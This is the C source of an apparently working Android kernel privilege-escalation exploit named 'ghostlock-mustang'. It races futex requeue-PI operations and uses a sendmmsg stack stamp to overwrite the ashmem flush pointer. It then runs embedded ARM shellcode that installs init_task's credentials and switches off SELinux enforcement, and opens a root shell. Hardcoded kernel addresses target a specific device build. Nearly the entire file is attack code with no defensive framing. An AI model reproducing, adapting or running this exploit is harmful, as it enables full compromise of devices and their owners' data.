#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_sendmmsg
#define __NR_sendmmsg 345
#endif
#ifndef __NR_pselect6
#define __NR_pselect6 375
#endif

#define PAYLOAD_VA   0x01000000u
#define MODPROBE_PATH 0xc111488cu
#define SCRATCH_VA   0xc1114910u
#define ASHMEM_FOPS  0xc0ca1f14u
#define FOPS_FLUSH   (ASHMEM_FOPS + 0x34)
#define INIT_TASK_VA 0xc0d71510u
#define SELINUX_ENF  0xc1213ea8u
#define TASK_CRED_OFF    0x560
#define TASK_REALCRED_OFF 0x55c
#define TI_TASK_OFF      0x0c

#define WAITER_WAIT_SEC     1
#define CONSUMER_DELAY_USEC 15000
#define CONSUMER_NICE       19

static int stamp_nfds   = 224;
static int stamp_off    = 0x24;

static uint32_t f_wait;
static uint32_t f_pi_target;
static uint32_t f_pi_chain;

static atomic_int g_waiter_tid;
static atomic_int g_waiter_ready;
static atomic_int g_waiter_waiting;
static atomic_int g_owner_started;
static atomic_int g_consumer_go;
static atomic_int g_consumer_done;

#define LOG(...) do { fprintf(stderr, __VA_ARGS__); fflush(stderr); } while (0)

struct local_sched_attr {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint64_t sched_period;
};

static long sched_setattr_tid(int tid, int nice_val) {
    struct local_sched_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.size         = sizeof(attr);
    attr.sched_policy = 3;
    attr.sched_nice   = nice_val;
    return syscall(__NR_sched_setattr, tid, &attr, 0);
}

static void pin_to_core(int core) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(core, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

__attribute__((naked, noinline, target("arm"), used))
static void gl_payload(void) {
    __asm__ volatile(
        "push {r4, r5, r6, r7, lr}\n"
        "movw r5, #0x1510\n"
        "movt r5, #0xc0d7\n"
        "ldr  r5, [r5, #0x560]\n"
        "mov  r3, sp\n"
        "bic  r3, r3, #0x1fc0\n"
        "bic  r3, r3, #0x3f\n"
        "ldr  r3, [r3, #0x0c]\n"
        "str  r5, [r3, #0x55c]\n"
        "str  r5, [r3, #0x560]\n"
        "movw r6, #0x3ea8\n"
        "movt r6, #0xc121\n"
        "mov  r7, #0\n"
        "str  r7, [r6]\n"
        "movw r6, #0x1f48\n"
        "movt r6, #0xc0ca\n"
        "str  r7, [r6]\n"
        "mov  r0, #0\n"
        "pop  {r4, r5, r6, r7, pc}\n"
    );
}
__attribute__((naked, noinline, target("arm"), used))
static void gl_payload_end(void) {
    __asm__ volatile("bx lr\n");
}

static int build_payload_page(void) {
    uintptr_t a0 = (uintptr_t)&gl_payload, a1 = (uintptr_t)&gl_payload_end;
    size_t sz = (a1 > a0) ? (size_t)(a1 - a0) : 128;
    if (sz > 512) sz = 512;
    void *p = mmap((void *)PAYLOAD_VA, 0x1000,
                   PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (p != (void *)PAYLOAD_VA) {
        LOG("[-] payload mmap at %#x: %s (execmem blocked?)\n",
            PAYLOAD_VA, strerror(errno));
        return -1;
    }
    uint32_t sled = 0xEA000001;
    memcpy((void *)PAYLOAD_VA, &sled, 4);
    memcpy((void *)(PAYLOAD_VA + 8), (void *)&gl_payload, sz);
    __builtin___clear_cache((char *)PAYLOAD_VA, (char *)(PAYLOAD_VA + 0x1000));
    LOG("[+] payload %#x..%#x (%zu bytes) RWX mapped\n",
        PAYLOAD_VA, PAYLOAD_VA + 8 + (unsigned)sz, sz);
    return 0;
}

static void widen_fdtable(int nfds) {
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur < (rlim_t)(nfds + 128)) {
        rl.rlim_cur = (rl.rlim_max < (rlim_t)(nfds + 128)) ? rl.rlim_max : (rlim_t)(nfds + 128);
        setrlimit(RLIMIT_NOFILE, &rl);
    }
    int pfd[2];
    if (pipe(pfd) != 0)
        return;
    int wr = nfds + 64;
    if (dup2(pfd[1], wr) < 0)
        LOG("[!] widen: dup2(%d) %s\n", wr, strerror(errno));
    if (pfd[1] != wr)
        close(pfd[1]);
    for (int fd = 3; fd < nfds; fd++) {
        if (fd == pfd[0] || fd == wr)
            continue;
        dup2(pfd[0], fd);
    }
}

#include <sys/socket.h>
struct stamp_iov {
    uint32_t base;
    uint32_t len;
};

static atomic_int g_stamped;

static void do_stamp_stack(void) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        LOG("[-] stamp socket: %s\n", strerror(errno));
        return;
    }

    static struct stamp_iov iovs[8];
    memset(iovs, 0, sizeof(iovs));
    iovs[4].len  = PAYLOAD_VA;
    iovs[5].base = 0;
    iovs[5].len  = FOPS_FLUSH;
    iovs[7].len  = INIT_TASK_VA;
    if (getenv("GL_SAFE")) {
        iovs[4].len = 0;
        iovs[5].len = 0;
        iovs[7].len = 0;
        LOG("[*] SAFE iov stamp\n");
    }

    struct {
        void *msg_name;
        uint32_t msg_namelen;
        struct stamp_iov *msg_iov;
        uint32_t msg_iovlen;
        void *msg_control;
        uint32_t msg_controllen;
        uint32_t msg_flags;
    } mh;
    memset(&mh, 0, sizeof(mh));
    mh.msg_name = (void *)(uintptr_t)SCRATCH_VA;
    mh.msg_namelen = 0;
    mh.msg_iov = iovs;
    mh.msg_iovlen = 8;

    struct {
        struct {
            void *msg_name;
            uint32_t msg_namelen;
            struct stamp_iov *msg_iov;
            uint32_t msg_iovlen;
            void *msg_control;
            uint32_t msg_controllen;
            uint32_t msg_flags;
        } msg_hdr;
        uint32_t msg_len;
    } mmsg;
    memcpy(&mmsg.msg_hdr, &mh, sizeof(mh));
    mmsg.msg_len = 0;

    LOG("[*] stamp: firing sendmmsg (last syscall on this stack)\n");
    syscall(__NR_sendmmsg, s, &mmsg, 1, 0);
    atomic_store(&g_stamped, 1);
    for (;;)
        pause();
}

static void *waiter_thread(void *arg) {
    (void)arg;
    pin_to_core(2);
    int tid = (int)syscall(__NR_gettid);
    atomic_store(&g_waiter_tid, tid);

    if (syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
        LOG("[-] waiter LOCK_PI chain: %s\n", strerror(errno));
        return NULL;
    }
    atomic_store(&g_waiter_ready, 1);
    while (!atomic_load(&g_owner_started))
        usleep(1000);

    struct timespec timeout;
    clock_gettime(CLOCK_MONOTONIC, &timeout);
    timeout.tv_sec += WAITER_WAIT_SEC;
    struct timespec *tsp = &timeout;
    if (getenv("GL_INFINITE")) {
        tsp = NULL;
        LOG("[*] waiter: infinite timeout\n");
    }
    atomic_store(&g_waiter_waiting, 1);

    LOG("[*] waiter: WAIT_REQUEUE_PI\n");
    syscall(__NR_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
            tsp, &f_pi_target, 0);
    LOG("[*] waiter: requeue returned errno=%d\n", errno);
    do_stamp_stack();
    return NULL;
}

static void *owner_thread(void *arg) {
    (void)arg;
    if (syscall(__NR_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
        LOG("[-] owner LOCK_PI target: %s\n", strerror(errno));
        return NULL;
    }
    while (!atomic_load(&g_waiter_ready))
        usleep(1000);
    atomic_store(&g_owner_started, 1);
    syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    while (1) sleep(1);
    return NULL;
}

static void *consumer_thread(void *arg) {
    (void)arg;
    pin_to_core(3);
    int tid = 0;
    while (!(tid = atomic_load(&g_waiter_tid)))
        usleep(1000);
    if (getenv("GL_NOCONSUMER")) {
        LOG("[*] consumer disabled (isolation run)\n");
        while (1) sleep(1);
        return NULL;
    }
    while (!atomic_load(&g_stamped))
        usleep(1000);
    usleep(100000);
    LOG("[*] consumer: about to sched_setattr(%d)\n", tid);
    long ret = sched_setattr_tid(tid, CONSUMER_NICE);
    LOG("[*] consumer: ret=%ld errno=%d\n", ret, errno);
    atomic_store(&g_consumer_done, 1);
    while (1) sleep(1);
    return NULL;
}

static int trigger_root(void) {
    int fd = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
    if (fd < 0) {
        LOG("[-] ashmem open: %s\n", strerror(errno));
        return -1;
    }
    close(fd);
    return 0;
}

int main(int argc, char **argv) {
    if (argc > 1) stamp_off = (int)strtol(argv[1], NULL, 0);
    if (argc > 2) stamp_nfds = atoi(argv[2]);

    LOG("[*] ghostlock-mustang pid=%d: off=%#x nfds=%d\n", getpid(), stamp_off, stamp_nfds);

    if (build_payload_page() != 0)
        return 1;

    pthread_t waiter, owner, consumer;
    pthread_create(&waiter, NULL, waiter_thread, NULL);
    pthread_create(&owner, NULL, owner_thread, NULL);
    pthread_create(&consumer, NULL, consumer_thread, NULL);

    while (!atomic_load(&g_waiter_waiting) || !atomic_load(&g_owner_started))
        usleep(1000);
    usleep(50000);

    LOG("[*] main: CMP_REQUEUE_PI\n");
    errno = 0;
    syscall(__NR_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1,
            (void *)1, &f_pi_target, 0);
    LOG("[*] main: requeue errno=%d\n", errno);

    while (!atomic_load(&g_consumer_done))
        sleep(1);
    LOG("[+] chain done, firing ashmem close\n");

    if (trigger_root() != 0)
        return 1;

    usleep(300000);
    LOG("[*] uid=%d euid=%d\n", getuid(), geteuid());
    if (getuid() == 0) {
        LOG("[+] ROOTED\n");
        execl("/system/bin/sh", "sh", (char *)NULL);
    }
    LOG("[-] not root, write did not land\n");
    return 1;
}
